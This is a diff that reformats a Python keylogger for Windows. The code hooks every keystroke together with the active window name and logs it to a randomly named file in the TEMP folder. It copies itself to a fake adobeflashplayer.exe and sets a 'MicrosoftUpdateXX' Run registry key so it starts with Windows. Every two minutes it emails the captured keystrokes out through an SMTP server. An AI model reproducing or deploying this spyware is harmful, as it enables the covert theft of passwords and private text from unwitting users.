@@ -1,51 +1,66 @@
 import pythoncom
 import pyHook
 from os import path
-import urllib, urllib2
+import urllib
+import urllib2
 import win32com.client
-import win32event, win32api, winerror
+import win32event
+import win32api
+import winerror
 from _winreg import *
 import shutil
 import sys
 import datetime
-import os, random, smtplib, string, time, threading
+import os
+import random
+import smtplib
+import string
+import time
+import threading
 from email.mime.text import MIMEText
 
 lastWindow = ''
+
+def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
+    return ''.join(random.choice(chars) for _ in range(size))
+
 
 global logfile
 
 def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
     return ''.join(random.choice(chars) for _ in range(size))
 
-directory = "C:\\winos\\"
+temp_path = os.getenv('TEMP')
+logfile = temp_path + "\\" + id_generator(15)
 
-if not os.path.exists(directory):
-    os.makedirs(directory)
-logfile = directory + "\\" + id_generator(15)
-
-f = open(logfile,"a")
-f.write("")
+f = open(logfile, 'a')
+f.write('')
 f.close()
 
 ironm = win32event.CreateMutex(None, 1, 'NOSIGN')
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     ironm = None
-    print "nope"
+    print 'nope'
     sys.exit()
 
 dir = r"C:\Users\Public\Libraries\adobeflashplayer.exe"
 
+
 def startup():
     shutil.copy(sys.argv[0], dir)
     aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
-    aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
-    SetValueEx(aKey,"MicrosoftUpdateXX", 0, REG_SZ, dir)    
+    aKey = OpenKey(aReg,
+                   r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0,
+                   KEY_WRITE)
+    SetValueEx(aKey, 'MicrosoftUpdateXX', 0, REG_SZ, dir)
+
+
 if not path.isfile(dir):
-    startup()   
+    startup()
 
 
 def keylogger():
+
     def OnKeyboardEvent(event):
         global lastWindow
         window = event.WindowName
@@ -67,17 +82,17 @@ def keylogger():
             40: ' [DOWN] ',
             37: ' [LEFT] ',
             39: ' [RIGHT] ',
-            91: ' [SUPER] '
+            91: ' [SUPER] ',
             }
         keyboardKeyName = keys.get(event.Ascii, chr(event.Ascii))
         data = ''
         if window != lastWindow:
             lastWindow = window
-            data += '\n\n { ' + lastWindow + ' } \n'
-            data += keyboardKeyName 
+            data += '\n\n{ ' + lastWindow + ' } \n'
+            data += keyboardKeyName
         else:
             data += keyboardKeyName
-        f = open(logfile,"a")
+        f = open(logfile, 'a')
         f.write(data)
         f.close()
 
@@ -93,7 +108,7 @@ def mailsender():
 
     while 1:
         time.sleep(120)
-        fo = open(logfile, "r")
+        fo = open(logfile, 'r')
         msg = MIMEText(fo.read())
         fo.close()
 
@@ -105,8 +120,9 @@ def mailsender():
 
             try:
                 s = smtplib.SMTP('smtp.gmx.com:25')
-                # s = smtplib.SMTP_SSL('smtp.gmail.com:587')
-                s.login(mail,password)
+
+                # s = smtplib.SMTP_SSL('smtp.india.com:465')
+                s.login(mail, password)
                 s.sendmail(mail, [mail], msg.as_string())
                 s.close()
             except Exception, a:
@@ -114,8 +130,8 @@ def mailsender():
 
 
 if __name__ == '__main__':
-	thread1 = threading.Thread(name="log", target=keylogger)
-	thread2 = threading.Thread(name="mail", target=mailsender)
+    thread1 = threading.Thread(name='log', target=keylogger)
+    thread2 = threading.Thread(name='mail', target=mailsender)
 
-	thread1.start()
-	thread2.start()
+    thread1.start()
+    thread2.start()
